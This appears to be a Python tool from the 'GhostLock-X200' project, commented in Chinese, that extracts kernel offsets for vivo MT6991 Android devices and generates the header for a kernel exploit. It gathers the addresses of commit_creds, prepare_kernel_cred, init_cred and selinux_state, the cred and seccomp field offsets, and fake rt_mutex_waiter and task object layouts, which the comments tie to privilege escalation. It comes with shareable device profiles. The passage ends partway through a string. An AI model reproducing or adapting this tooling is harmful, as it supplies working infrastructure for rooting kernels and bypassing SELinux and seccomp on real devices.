#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 GhostLock-X200 contributors
"""
offsets_auto.py — 全量偏移提取器 (GhostLock x200 / vivo MT6991)

把"编译期硬编码"与"运行时动态值"全部自动化，只需 3 个输入：
  1. kallsyms 转储 (设备 /proc/kallsyms 或 ELF .symtab)
  2. vmlinux BTF  (/sys/kernel/btf/vmlinux 或 ELF 内嵌)
  3. kernel ELF  (boot.img 解出的 vmlinux, 用于镜像固有偏移/反汇编窗口)

子命令:
  live   <kallsyms.txt> <vmlinux.btf> <win_offs.json> <out.json>
         # 运行时动态值 (STAGE3.4 原功能, 输出格式不变, 零版本硬编码)
  header <kallsyms.txt> <vmlinux.btf> [-o target_x200.h]
         [--w2host w2host.c] [--diff 旧target.h]
         # 编译期全量偏移 → 生成完整 target_x200.h (+ 同步 w2host.c 的
         #   TASK_CRED_OFF/TASK_COMM_OFF), 可选与旧头文件对比
  winoffs <kernel.elf> <out_win_offs.json> [--task-cred-off 0x820]
         # 镜像固有偏移 (physmap_base + sym_offs + w2host 采样窗口)
         # 依赖 capstone (win_extract.py 迁移)
  winoffs-image <Image/kernel.raw/boot.img> <kallsyms.txt> <out.json>
         [--task-cred-off 0x820]
         # 内核镜像直反汇编生成 win_offs (无需 vmlinux-to-elf; 符号用离线/设备
         # kallsyms, rel = VA - _text; boot.img 自动提取内核段+解压)
  all    <kallsyms> <btf> <kernel.elf> <outdir>
         # 一键: header + winoffs + offsets.json
  feasibility <素材> [--profile x200_b57.json] [--soc dimensity]
          [--kernel-release 6.6.89-android15-8-gb57af212129c-abogki457297774-4k]
          # 机型可行性预检: 输出 推荐/可尝试/不推荐 + 逐项原因.
          # 检查: boot.img kernel_size=0 (init_boot 误选) / 内核 release 是否
          # 已知族 (profiles/) / SoC (MTK 未知族 → 不推荐) / vermagic 匹配 /
          # 可选 ikconfig CONFIG_PANIC_ON_OOPS.
  offline <素材> --out-dir <dir> [--branch 6.1|6.6|6.12|auto]
          # 离线恢复 kallsyms + BTF (无需设备/vmlinux-to-elf), 支持 6.1/6.6/6.12.
          # 输出 kallsyms.txt + vmlinux.btf + offline_meta.json, 可直接喂 header.
  derive-pselect <kernel.elf> --kallsyms <kallsyms.txt> --btf <vmlinux.btf>
          [-o pselect.json] [--objdump <path>] [--nfds 264]
          # pselect 栈布局推导: 反汇编调用链 + 帧叠加 → psselect_waiter_word_shift.
          # objdump 探测: --objdump > PATH > WSL kali (优先 aarch64-linux-gnu-objdump).
  detect-p0 [--iomem <文件>] [--serial <sn>] [--write-profile <profile.json>]
          [--devicetree]
          # P0 物理常量: /proc/iomem → phys_offset + kernel_phys_load (6 项反向校验).
          # 双通道: --iomem (root, 精确) / --devicetree (非 root, 读设备
          #   /sys/firmware/devicetree/base/memory/reg, kernel_phys_load 推定);
          # 缺省自动: 先 devicetree 后 su iomem.
  package <素材> --out <devices/名目录> [--device-id <id>] [--soc x] [--family x]
          [--force]
          # 自动提取全套并整合为可分享机型模块 (device.json + win_offs.json +
          # target.h + pselect.json + manifest.json); 未收录机型自动生成并保存
          # (verified=false, P0 物理常量待填); 已收录时提示 (--force 重建).
  verify-device <名>
          # 按 manifest SHA256 校验机型模块完整性 (导入后建议执行).

全部子命令支持 [--profile <机型模块>] (devices/<名>/ 目录 / device.json 路径 /
旧 profiles/<名>.json 兼容回退):
  - header/winoffs: P0 常量 (KIMAGE_TEXT_BASE/P0_*/IDENTITY/DIRECT_MAP/VMEMMAP)
    与 physmap_base 从机型模块读取, 不硬编码.
  - 缺省模块: devices/x200_b57 (随仓库分享示例).
  可分享机型模块: devices/<机型名>/ 目录 (device.json + 偏移产物 + manifest.json);
  未收录机型用 package 自动生成, 导入他人模块解压到 devices/ 后同机型自动命中.

离线恢复提供者 (M4, 已实施):
  recover_kallsyms(kernel_raw, branch) / locate_btf(kernel_raw, kallsyms)
  已由 offline 子命令接入; 使 header/winoffs 可在无设备、无 vmlinux-to-elf 时
  仅凭 boot.img 产出全部偏移 (算法原理公开, 代码独立实现).

兼容性:
  - 符号: 精确名 + Rust 修饰名模糊回退 (ashmem fops_*...ashmem_rust6Ashmem 等)
  - 结构: 完整 BTF 图解析 (RANDSTRUCT 匿名结构/联合递归, 位域 kflag)
  - 校验: 生成后与已知 target_x200.h 对比, 缺失必需符号即失败 (不猜)
"""

import sys, os, json, re, struct, subprocess, shutil, hashlib, tempfile


# ============================================================
# 1. kallsyms / ELF 符号解析
# ============================================================

def parse_kallsyms(path):
    """返回 (syms: 名字->首个地址, stype, sym_all: 名字->全部地址)."""
    syms, stype, sym_all = {}, {}, {}
    for line in open(path, errors="replace"):
        p = line.split()
        if len(p) >= 3:
            try:
                a = int(p[0], 16)
            except ValueError:
                continue
            if a:
                if p[2] not in syms:
                    syms[p[2]] = a
                    stype[p[2]] = p[1]
                sym_all.setdefault(p[2], []).append(a)
    return syms, stype, sym_all


def parse_elf_symtab(path):
    """从 ELF .kernel/.symtab 提取符号表 + 静态 text 基址 (无需 pyelftools)."""
    data = open(path, "rb").read()
    e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", data, 0x3A)[0]
    e_shnum = struct.unpack_from("<H", data, 0x3C)[0]
    e_shstrndx = struct.unpack_from("<H", data, 0x3E)[0]
    sections = {}
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size = \
            struct.unpack_from("<IIQQQQ", data, off)
        sections[i] = dict(name_off=sh_name, type=sh_type, addr=sh_addr,
                           offset=sh_offset, size=sh_size)
    shstr = sections[e_shstrndx]
    shstr_data = data[shstr["offset"]:shstr["offset"] + shstr["size"]]

    def sec_name(i):
        o = sections[i]["name_off"]
        e = shstr_data.find(b"\0", o)
        return shstr_data[o:e].decode(errors="replace")

    names = {i: sec_name(i) for i in sections}
    kern_sec = next((sections[i] for i in sections if names[i] == ".kernel"), None)
    sym_sec = next((sections[i] for i in sections if names[i] == ".symtab"), None)
    str_sec = next((sections[i] for i in sections if names[i] == ".strtab"), None)
    if not (kern_sec and sym_sec and str_sec):
        return None, None
    strdata = data[str_sec["offset"]:str_sec["offset"] + str_sec["size"]]
    syms, stype = {}, {}
    entsize = sym_sec["size"] // (sym_sec["size"] // 24) if sym_sec["size"] else 24
    # 标准 entsize=24, 逐个解析
    n = sym_sec["size"] // 24
    for i in range(n):
        st_name, st_info, st_other, st_shndx, st_value, st_size = \
            struct.unpack_from("<IBBHQQ", data, sym_sec["offset"] + i * 24)
        if st_shndx == 0 or st_value == 0:
            continue
        e = strdata.find(b"\0", st_name)
        name = strdata[st_name:e].decode(errors="replace")
        if name and name not in syms:
            syms[name] = st_value
            stype[name] = chr(st_info & 0xF) if (st_info & 0xF) else "?"
    return syms, kern_sec["addr"]


def find_sym(syms, want):
    """精确匹配, 失败时 Rust 修饰名/子串模糊回退."""
    if want in syms:
        return syms[want]
    # Rust 修饰回退规则 (依 GhostLock-for-OnePlus extract_target.py)
    rust_frags = {
        "ashmem_ioctl": ("fops_ioctl", "ashmem_rust6Ashmem", "6AshmemE5ioctl"),
        "compat_ashmem_ioctl": ("fops_compat_ioctl", "ashmem_rust6Ashmem",
                                "6AshmemE12compat_ioctl"),
        "ashmem_mmap": ("fops_mmap", "ashmem_rust6Ashmem", "6AshmemE4mmap"),
        "ashmem_open": ("fops_open", "ashmem_rust6Ashmem", "6AshmemE4open"),
        "ashmem_release": ("fops_release", "ashmem_rust6Ashmem", "6AshmemE7release"),
        "ashmem_show_fdinfo": ("fops_show_fdinfo", "ashmem_rust6Ashmem",
                               "6AshmemE11show_fdinfo"),
        "ashmem_fops": ("ashmem_fops", "Ashmem"),
    }
    if want in rust_frags:
        frags = rust_frags[want]
        for name, addr in syms.items():
            low = name.lower()
            if "toggle" in low:
                continue
            if all(f in name for f in frags):
                return addr
    # 通用: 唯一子串匹配 (结尾锚定优先)
    hits = [addr for name, addr in syms.items() if want in name]
    if len(hits) == 1:
        return hits[0]
    return None


# ============================================================
# 2. BTF 完整解析 (类型图, RANDSTRUCT 匿名成员递归)
# ============================================================

def parse_btf_full(path):
    """解析 vmlinux BTF → 1-based types 列表.
    rec: {id, kind, name, size, members:[{name,type,bit}]}"""
    data = open(path, "rb").read()
    magic, ver, flags, hdr_len, type_off, type_len, str_off, str_len = \
        struct.unpack_from("<HBBIIIII", data, 0)
    if magic != 0xEB9F:
        raise ValueError("not a BTF file (magic)")
    strs = data[hdr_len + str_off: hdr_len + str_off + str_len]

    def sname(o):
        e = strs.find(b"\0", o)
        return strs[o:e].decode(errors="replace") if 0 <= o < len(strs) else ""

    types = [None]
    off = hdr_len + type_off
    end = off + type_len
    tid = 1
    while off < end:
        name_off, info, st = struct.unpack_from("<III", data, off)
        off += 12
        kind = (info >> 24) & 0x1F
        vlen = info & 0xFFFF
        kflag = (info >> 31) & 1
        rec = {"id": tid, "kind": kind, "name": sname(name_off),
               "size": st, "members": []}
        if kind in (4, 5):                      # STRUCT / UNION
            for _ in range(vlen):
                mno, mtype, moff = struct.unpack_from("<III", data, off)
                off += 12
                rec["members"].append(
                    {"name": sname(mno), "type": mtype,
                     "bit": (moff & 0xFFFFFF) if kflag else moff})
        elif kind in (6, 13):                   # ENUM / FUNC_PROTO (vlen*8)
            off += vlen * 8
        elif kind in (15, 19):                  # DATASEC / ENUM64 (vlen*12)
            off += vlen * 12
        elif kind in (1, 14, 16, 17):           # INT / VAR / FLOAT / DECL_TAG
            off += 4
        # PTR/ARRAY/FWD/TYPEDEF/VOLATILE/CONST/RESTRICT/FUNC/TYPE_TAG: 无附加
        types.append(rec)
        tid += 1
    return types


def btf_find(types, name, kind=4):
    return [t for t in types[1:] if t["kind"] == kind and t["name"] == name]


def btf_resolve_member(types, tid, name, base=0, depth=0, seen=None):
    """递归查找成员 (穿过匿名 struct/union), 返回绝对字节偏移或 None."""
    if seen is None:
        seen = set()
    if tid is None or tid <= 0 or tid >= len(types) or depth > 16 or tid in seen:
        return None
    seen.add(tid)
    t = types[tid]
    if t is None:
        return None
    for m in t["members"]:
        if m["name"] == name:
            return base + (m["bit"] >> 3)
    for m in t["members"]:
        if m["name"] == "":
            r = btf_resolve_member(types, m["type"], name,
                                   base + (m["bit"] >> 3), depth + 1, seen)
            if r is not None:
                return r
    return None


def btf_member(types, t, name):
    """直接成员 (非匿名) 字节偏移."""
    for m in t["members"]:
        if m["name"] == name:
            return m["bit"] >> 3
    return None


def btf_struct_size(types, name):
    hits = btf_find(types, name)
    return max(t["size"] for t in hits) if hits else None


def btf_find_anon_mm(types):
    """mm_struct 因 __randomize_layout 以匿名名出现: 特征成员 pgd+owner+mmap."""
    for t in types[1:]:
        if t["kind"] != 4 or t["name"]:
            continue
        names = {m["name"] for m in t["members"]}
        if "pgd" in names and "owner" in names and "mm_users" in names:
            return t
    return None


# ============================================================
# 3. 提取规则 (事实来源: b57 target_x200.h + kallsyms/BTF 实证)
# ============================================================

# (define, 符号名, 附加偏移, 是否必需)
SYMBOL_RULES = [
    ("INIT_TASK_OFF",            "init_task",            0x00, True),
    ("ROOT_TASK_GROUP_OFF",      "root_task_group",      0x00, True),
    ("SELINUX_ENFORCING_OFF",    "selinux_state",        0x00, True),
    ("SELINUX_BLOB_SIZES_OFF",   "selinux_blob_sizes",   0x00, True),
    ("SECURITY_HOOK_HEADS_OFF",  "security_hook_heads",  0x00, True),
    ("KMALLOC_CACHES_OFF",       "kmalloc_caches",       0x00, True),
    ("ANON_PIPE_BUF_OPS_OFF",    "anon_pipe_buf_ops",    0x00, True),
    ("CONFIGFS_READ_ITER_OFF",       "configfs_read_iter",     0x00, True),
    ("CONFIGFS_BIN_WRITE_ITER_OFF",  "configfs_bin_write_iter",0x00, True),
    ("COPY_SPLICE_READ_OFF",     "copy_splice_read",     0x00, True),
    ("NOOP_LLSEEK_OFF",          "noop_llseek",          0x00, True),
    ("ASHMEM_MISC_FOPS_OFF",     "ashmem_misc",          0x10, True),  # miscdevice.fops
    ("ASHMEM_FOPS_OFF",          "ashmem_fops",          0x00, True),
    ("ASHMEM_IOCTL_OFF",         "ashmem_ioctl",         0x00, True),
    ("ASHMEM_COMPAT_IOCTL_OFF",  "compat_ashmem_ioctl",  0x00, True),
    ("ASHMEM_MMAP_OFF",          "ashmem_mmap",          0x00, True),
    ("ASHMEM_OPEN_OFF",          "ashmem_open",          0x00, True),
    ("ASHMEM_RELEASE_OFF",       "ashmem_release",       0x00, True),
    ("ASHMEM_SHOW_FDINFO_OFF",   "ashmem_show_fdinfo",   0x00, True),
    ("SLIDE_NFULNL_LOGGER_OFF",      "nfulnl_logger",    0x00, True),
    ("SLIDE_LOGGERS_0_1_OFF",        "loggers",          0x00, True),
    ("SLIDE_RANDOM_BOOT_ID_DATA_OFF","sysctl_bootid",    0x00, True),
    ("SLIDE_SYSCTL_BOOTID_OFF",      "sysctl_bootid",    0x00, True),
    ("SLIDE_INIT_CRED_OFF",      "init_cred",            0x00, True),
]

# 运行时 win_offs/offsets.json 用 (非 header)
RUNTIME_SYMBOLS = [
    ("selinux_state",       0x00, True),
    ("kptr_restrict",       0x00, True),
    ("init_cred",           0x00, True),
    ("init_user_ns",        0x00, True),
    ("__dump_skip.zeroes",  0x00, True),   # 宿主 GL_LOCK 全零区
    ("commit_creds",        0x00, True),
    ("prepare_kernel_cred", 0x00, True),
    ("__arm64_sys_getuid",  0x00, True),
    ("__arm64_sys_geteuid", 0x00, True),
    ("__arm64_sys_getresuid",0x00, True),
]

# BTF 结构字段: (结构名, 字段名, define)
BTF_FIELD_RULES = [
    # task_struct → FAKE_TASK_* / TASK_*
    ("task_struct", "usage",          "FAKE_TASK_USAGE_OFF"),
    ("task_struct", "prio",           "FAKE_TASK_PRIO_OFF"),
    ("task_struct", "normal_prio",    "FAKE_TASK_NORMAL_PRIO_OFF"),
    ("task_struct", "sched_task_group","FAKE_TASK_TASK_GROUP_OFF"),
    ("task_struct", "pi_lock",        "FAKE_TASK_PI_LOCK_OFF"),
    ("task_struct", "pi_waiters",     "FAKE_TASK_PI_WAITERS_OFF"),
    ("task_struct", "pi_top_task",    "FAKE_TASK_PI_TOP_TASK_OFF"),
    ("task_struct", "pi_blocked_on",  "FAKE_TASK_PI_BLOCKED_ON_OFF"),
    ("task_struct", "pid",            "TASK_PID_OFF"),
    ("task_struct", "tgid",           "TASK_TGID_OFF"),
    ("task_struct", "real_parent",    "TASK_REAL_PARENT_OFF"),
    ("task_struct", "atomic_flags",   "TASK_ATOMIC_FLAGS_OFF"),
    ("task_struct", "real_cred",      "TASK_REAL_CRED_OFF"),
    ("task_struct", "cred",           "TASK_CRED_OFF"),
    ("task_struct", "comm",           "TASK_COMM_OFF"),
    ("task_struct", "tasks",          "TASK_TASKS_OFF"),
    ("task_struct", "seccomp",        "TASK_SECCOMP_OFF"),
    # cred
    ("cred", "uid",                   "CRED_UID_OFF"),
    ("cred", "securebits",            "CRED_SECUREBITS_OFF"),
    ("cred", "cap_inheritable",       "CRED_CAPS_OFF"),
    ("cred", "security",              "CRED_SECURITY_OFF"),
    # seccomp
    ("seccomp", "mode",               "SECCOMP_MODE_OFF"),
    ("seccomp", "filter_count",       "SECCOMP_FILTER_COUNT_OFF"),
    ("seccomp", "filter",             "SECCOMP_FILTER_OFF"),
    # file_operations
    ("file_operations", "owner",          "FOPS_OWNER_OFF"),
    ("file_operations", "llseek",         "FOPS_LLSEEK_OFF"),
    ("file_operations", "read",           "FOPS_READ_OFF"),
    ("file_operations", "write",          "FOPS_WRITE_OFF"),
    ("file_operations", "read_iter",      "FOPS_READ_ITER_OFF"),
    ("file_operations", "write_iter",     "FOPS_WRITE_ITER_OFF"),
    ("file_operations", "unlocked_ioctl", "FOPS_IOCTL_OFF"),
    ("file_operations", "compat_ioctl",   "FOPS_COMPAT_IOCTL_OFF"),
    ("file_operations", "mmap",           "FOPS_MMAP_OFF"),
    ("file_operations", "open",           "FOPS_OPEN_OFF"),
    ("file_operations", "release",        "FOPS_RELEASE_OFF"),
    ("file_operations", "splice_read",    "FOPS_SPLICE_READ_OFF"),
    ("file_operations", "show_fdinfo",    "FOPS_SHOW_FDINFO_OFF"),
    # configfs_buffer → CFG_* (util.c 构造 configfs 伪对象)
    ("configfs_buffer", "page",           "CFG_PAGE_OFF"),
    ("configfs_buffer", "needs_read_fill","CFG_NEEDS_READ_FILL_OFF"),
    ("configfs_buffer", "bin_buffer",     "CFG_BIN_BUFFER_OFF"),
    ("configfs_buffer", "bin_buffer_size","CFG_BIN_BUFFER_SIZE_OFF"),
    ("configfs_buffer", "cb_max_size",    "CFG_CB_MAX_SIZE_OFF"),
    # task_security_struct → SELINUX_CRED_*
    ("task_security_struct", "osid",      "SELINUX_CRED_OSID_OFF"),
    ("task_security_struct", "sid",       "SELINUX_CRED_SID_OFF"),
    # rt_mutex_waiter 真实布局 (RANDSTRUCT, 信息/校验用; WAITER_* 当前为死代码)
    ("rt_mutex_waiter", "tree",       "WAITER_TREE_ENTRY_OFF"),
    ("rt_mutex_waiter", "pi_tree",     "WAITER_PI_TREE_ENTRY_OFF"),
    ("rt_mutex_waiter", "task",        "WAITER_TASK_OFF"),
    ("rt_mutex_waiter", "lock",        "WAITER_LOCK_OFF"),
    ("rt_mutex_waiter", "wake_state",  "WAITER_WAKE_STATE_OFF"),
    ("rt_mutex_waiter", "ww_ctx",      "WAITER_WW_CTX_OFF"),
    # selinux_state.enforcing (运行时 offsets.json)
    ("selinux_state", "enforcing",     "SELINUX_STATE_ENFORCING_FIELD"),
]

# 结构大小
BTF_SIZE_RULES = [
    ("page",            "STRUCT_PAGE_SIZE"),     # 0x40
    ("pipe_buffer",     "PIPE_BUFFER_SIZE"),     # 0x28
]


# ============================================================
# 3.5 profile 加载 (机型参数化: P0 常量 / 内核族 / SoC)
# ============================================================

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROFILE_DIR = os.path.join(SCRIPT_DIR, "profiles")   # 迁移期兼容 (旧单文件 profile)
DEVICES_DIR = os.path.normpath(os.path.join(SCRIPT_DIR, "..", "..", "devices"))
DEFAULT_DEVICE = "x200_b57"

# 必需字段 (缺一即报错); P0 常量必须为合法 0x 十六进制
PROFILE_FIELDS = [
    "device", "kernel_release", "family", "soc",
    "kimage_text_base", "p0_page_offset", "p0_phys_offset", "p0_kernel_phys_load",
    "identity_start", "identity_end", "direct_map_base", "direct_map_end",
    "vmemmap_start", "physmap_base",
]
# 可选字段及默认值
PROFILE_OPTIONAL = {
    "task_cred_off": "0x820",
    "variant": "x200_release",
    "fingerprint": "",
}


def _parse_p0(value, field, path):
    """P0 常量必须是合法正数 (支持 0x 前缀)."""
    try:
        if isinstance(value, str) and value.lower().startswith("0x"):
            v = int(value, 16)
        else:
            v = int(value)
    except (TypeError, ValueError):
        raise SystemExit(
            "FATAL: profile %s 字段 %s 非法: %r (期望 0x 十六进制)" % (path, field, value))
    if v <= 0:
        raise SystemExit(
            "FATAL: profile %s 字段 %s 非法: %r (期望正值)" % (path, field, value))
    return hex(v)


def _find_device_json(name_or_path):
    """解析机型模块 device.json 路径:
    devices/<名>/device.json / 目录 / 直接文件路径 / 旧 profiles/<名>.json (回退)."""
    if not name_or_path:
        return None
    if os.path.isdir(name_or_path):
        p = os.path.join(name_or_path, "device.json")
        if os.path.exists(p):
            return p
    if os.path.isfile(name_or_path):
        return name_or_path
    p = os.path.join(DEVICES_DIR, name_or_path, "device.json")
    if os.path.exists(p):
        return p
    p = os.path.join(PROFILE_DIR, name_or_path + ".json")
    if os.path.exists(p):
        return p
    return None


def load_profile(path=None):
    """加载机型模块 (device.json); 缺省 devices/x200_b57 (随仓库示例).
    path 支持: devices/<名> / 目录 / 文件路径 / 旧 profiles/<名>.json (回退)."""
    p = _find_device_json(path) if path else _find_device_json(DEFAULT_DEVICE)
    if p is None:
        raise SystemExit(
            "FATAL: 找不到机型模块: %r (devices/ 下应有 %s/device.json; 新机型: "
            "用 package 生成或复制 devices/x200_b57)" % (path, path or DEFAULT_DEVICE))
    try:
        data = json.load(open(p, encoding="utf-8"))
    except Exception as e:
        raise SystemExit("FATAL: device.json 读取失败 %s: %s" % (p, e))
    missing = [f for f in PROFILE_FIELDS if f not in data]
    if missing:
        raise SystemExit("FATAL: device.json %s 缺少必需字段: %s" % (p, ", ".join(missing)))
    for f in PROFILE_FIELDS:
        if f in ("device", "kernel_release", "family", "soc"):
            continue
        if f in ("p0_phys_offset", "p0_kernel_phys_load") and data[f] in (None, ""):
            continue  # 待填状态 (package 生成, verified=false; detect-p0/手动补齐)
        data[f] = _parse_p0(data[f], f, p)
    for f, dft in PROFILE_OPTIONAL.items():
        data.setdefault(f, dft)
    data["_device_json"] = p
    return data


def find_device(release):
    """扫描 devices/*/device.json 按 kernel_release 匹配.
    返回 (device_json_path, level): exact(精确) | family(同族) | none."""
    if not release or not os.path.isdir(DEVICES_DIR):
        return None, "none"
    best = None
    for entry in sorted(os.listdir(DEVICES_DIR)):
        djp = os.path.join(DEVICES_DIR, entry, "device.json")
        if not os.path.isfile(djp):
            continue
        try:
            dj = json.load(open(djp, encoding="utf-8"))
        except Exception:
            continue
        if dj.get("kernel_release") == release:
            return djp, "exact"
        fam = dj.get("family")
        if fam and fam in release and best is None:
            best = (djp, "family")
    return best if best else (None, "none")


def profile_is_mtk(profile):
    """soc 是否 MTK 系 (dimensity/helio/mt6xxx/mt9xxx)."""
    s = str(profile.get("soc", "")).lower()
    if "dimensity" in s or "helio" in s or "mtk" in s:
        return True
    return bool(re.match(r"^mt\d", s))


# ============================================================
# 4. header 模板常量 (平台/exploit 布局, 与内核版本无关)
# ============================================================

TEMPLATE_HEADER = r"""/* AUTO-GENERATED by offsets_auto.py — 全量偏移提取器
 * 生成时间: {ts}
 * 输入: kallsyms + vmlinux BTF {extra}
 * 符号偏移来自 kallsyms 实证; 结构偏移来自 BTF (含 RANDSTRUCT 真实布局).
 * 警告: 本文件由工具生成, 请勿手改; 重新生成请运行
 *   python tools/offset_tools/offsets_auto.py header <kallsyms> <btf> -o exploit/src/target_x200.h
 */
#ifndef OFFSET_H
#define OFFSET_H

#define BUILD_VARIANT_LABEL "{variant}"
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "{fingerprint}"
#endif

#define KIMAGE_TEXT_BASE {kimage_base}ULL
#define P0_PAGE_OFFSET {p0_page_offset}ULL
#define P0_PHYS_OFFSET {p0_phys_offset}ULL
#define P0_KERNEL_PHYS_LOAD {p0_kernel_phys_load}ULL
#define KERNELSNITCH_IDENTITY_START {identity_start}ULL /* PAGE_OFFSET: VA_BITS39 direct map low half 256GB */
#define KERNELSNITCH_IDENTITY_END {identity_end}ULL /* 64GB */
#define DIRECT_MAP_BASE {direct_map_base}ULL
#define DIRECT_MAP_END {direct_map_end}ULL
#define VMEMMAP_START {vmemmap_start}ULL

/* ===== 符号偏移 (kallsyms 实证, 相对 KIMAGE_TEXT_BASE) ===== */
{symbols}

{address_macros}

/* ===== slide 路由专用符号 ===== */
{slide_symbols}

{slide_macros}

/* ===== pselect 布局 (derive-pselect 反汇编推导; 未推导时默认 0) ===== */
#define PSELECT_WAITER_WORD_SHIFT {psselect_waiter_word_shift}
#ifndef PSELECT_ROUTE_NFDS
#define PSELECT_ROUTE_NFDS {psselect_route_nfds}
#endif

/* ===== 结构偏移 (BTF 实证) ===== */
/* rt_mutex_waiter 真实布局 (RANDSTRUCT). 注意: WAITER_* 当前为死代码,
 * 实际提权用 FAKE_WAITER_* (exploit 自建假对象布局, 见下). */
{waiter}

/* 假 waiter 布局 (exploit 内部, 与内核版本无关; 建议与 BTF rt_mutex_waiter 一致) */
{fake_waiter}

/* task_struct / mm_struct / cred / seccomp (BTF) */
{task_offsets}

{cred_offsets}

{seccomp_offsets}

/* struct page (BTF size + 稳定联合偏移) */
{page_offsets}

/* pipe (BTF size + 稳定常量) */
{pipe_offsets}

/* file_operations (BTF) */
{fops_offsets}

/* configfs_buffer (BTF) → util.c 构造 configfs 伪对象 */
{cfg_offsets}

/* ===== exploit 假对象内部布局 (与内核版本无关, 勿改) ===== */
#define LOCK_OFF      0x1350
#define W0_OFF        0x2220
#define FOPS_OFF      0x1000
#define SCRATCH_OFF   0x3000
#define RIGHT_OFF     0x4440
#define LEFT_OFF      0x5550
#define FAKE_TASK_OFF 0x3200

#define WAITER_LOCAL_OFF 0x80

#endif
"""


# ============================================================
# 5. 生成器
# ============================================================

def extract_symbols(syms, stype, sym_all):
    """返回 (define->rel_offset, 缺漏列表, 运行时 rel 表)."""
    base = syms.get("_text")
    if not base:
        raise SystemExit("FATAL: kallsyms 无 _text, 无法计算相对偏移")
    out, missing = {}, []
    for define, sym, delta, req in SYMBOL_RULES:
        addr = find_sym(syms, sym)
        if addr is None:
            if req:
                missing.append((define, sym))
            continue
        out[define] = addr - base + delta
    runtime = {}
    for sym, delta, req in RUNTIME_SYMBOLS:
        addr = find_sym(syms, sym)
        if addr is None:
            if req:
                missing.append(("RUNTIME:" + sym, sym))
            continue
        runtime[sym] = addr - base + delta
    return out, missing, runtime, base


def extract_btf(types):
    """返回 (define->offset, 缺漏列表, 额外信息)."""
    out, missing, extra = {}, [], {}
    structs = {}
    for sn, fld, define in BTF_FIELD_RULES:
        if sn not in structs:
            hits = btf_find(types, sn)
            structs[sn] = max(hits, key=lambda t: len(t["members"])) if hits else None
        t = structs[sn]
        if t is None:
            missing.append((define, sn + "." + fld))
            continue
        v = btf_member(types, t, fld)
        if v is None:
            v = btf_resolve_member(types, t["id"], fld)
        if v is None:
            missing.append((define, sn + "." + fld))
            continue
        out[define] = v
    for sn, define in BTF_SIZE_RULES:
        sz = btf_struct_size(types, sn)
        if sz is None:
            missing.append((define, "sizeof(" + sn + ")"))
        else:
            out[define] = sz
    mm = btf_find_anon_mm(types)
    if mm is not None:
        owner = btf_member(types, mm, "owner")
        if owner is not None:
            out["MM_OWNER_OFF"] = owner
    else:
        missing.append(("MM_OWNER_OFF", "mm_struct(anon).owner"))
    # 校验信息: FAKE_WAITER_* 应与真实 rt_mutex_waiter 一致
    rtw = structs.get("rt_mutex_waiter")
    if rtw is not None:
        extra["rt_mutex_waiter"] = {
            m["name"]: m["bit"] >> 3 for m in rtw["members"] if m["name"]}
    return out, missing, extra


def gen_header(sym_off, btf_off, opts):
    variant = opts.get("variant", "x200_release")
    fp = opts.get("fingerprint",
                  "vivo/PD2415/PD2415:16/BP2A.250605.031.A3_V000L1/"
                  "compiler260430161853:user/release-keys")
    for _k in ("kimage_base", "p0_page_offset", "p0_phys_offset",
               "p0_kernel_phys_load", "identity_start", "identity_end",
               "direct_map_base", "direct_map_end", "vmemmap_start"):
        if not opts.get(_k):
            raise SystemExit("FATAL: gen_header 缺少 %s (必须指定机型模块)" % _k)
    kb = opts["kimage_base"]

    def off(define, default=None):
        v = sym_off.get(define, btf_off.get(define, default))
        return ("0x%08xULL" % v) if v is not None else ("/* MISSING " + define + " */ 0x0ULL")

    main_defs = [d for d, _s, _d, _r in SYMBOL_RULES
                 if d in sym_off and not d.startswith("SLIDE_")]
    slide_defs = [d for d, _s, _d, _r in SYMBOL_RULES
                  if d in sym_off and d.startswith("SLIDE_")]
    sym_lines = []
    for define, sym, delta, req in SYMBOL_RULES:
        if define in main_defs:
            sym_lines.append("#define %-32s 0x%08xULL%s" % (
                define, sym_off[define],
                "  /* %s%s */" % (sym, ("+0x%x" % delta) if delta else "")))
    sym_text = "\n".join(sym_lines)
    addr_macros = "\n".join(
        "#define %-24s (KIMAGE_TEXT_BASE + %s)" % (define[:-4], define)
        for define in main_defs)

    slide_lines = []
    for define, sym, delta, req in SYMBOL_RULES:
        if define in slide_defs:
            slide_lines.append("#define %-32s 0x%08xULL%s" % (
                define, sym_off[define],
                "  /* %s%s */" % (sym, ("+0x%x" % delta) if delta else "")))
    slide_text = "\n".join(slide_lines)
    slide_text += "\n#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF"
    slide_text += "\n#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF"
    slide_macros = "\n".join(
        "#define %-28s \\\n  (KIMAGE_TEXT_BASE + %s)" % (define[:-4] + "_IMAGE", define)
        for define in ("SLIDE_NFULNL_LOGGER_OFF", "SLIDE_LOGGERS_0_1_OFF",
                       "SLIDE_RANDOM_BOOT_ID_DATA_OFF", "SLIDE_INIT_TASK_OFF",
                       "SLIDE_ROOT_TASK_GROUP_OFF", "SLIDE_SYSCTL_BOOTID_OFF")
        if define in sym_off or define in ("SLIDE_INIT_TASK_OFF",
                                           "SLIDE_ROOT_TASK_GROUP_OFF"))

    waiter = "\n".join(
        "#define %-28s 0x%x" % (d, btf_off[d]) if d in btf_off
        else "/* MISSING %s */ #define %s 0x0" % (d, d)
        for d in ("WAITER_TREE_ENTRY_OFF", "WAITER_PI_TREE_ENTRY_OFF",
                  "WAITER_TASK_OFF", "WAITER_LOCK_OFF", "WAITER_WAKE_STATE_OFF",
                  "WAITER_WW_CTX_OFF"))
    # prio/deadline 不在 BTF (本内核已移除): 按假对象惯例派生 tree+0x18/0x20
    waiter += "\n#define WAITER_PRIO_OFF        0x18  /* 派生: tree+0x18 (BTF 无 prio) */"
    waiter += "\n#define WAITER_DEADLINE_OFF    0x20  /* 派生: tree+0x20 (BTF 无 deadline) */"

    fake_waiter = """#define FAKE_WAITER_TREE_PRIO_OFF         0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF     0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x48
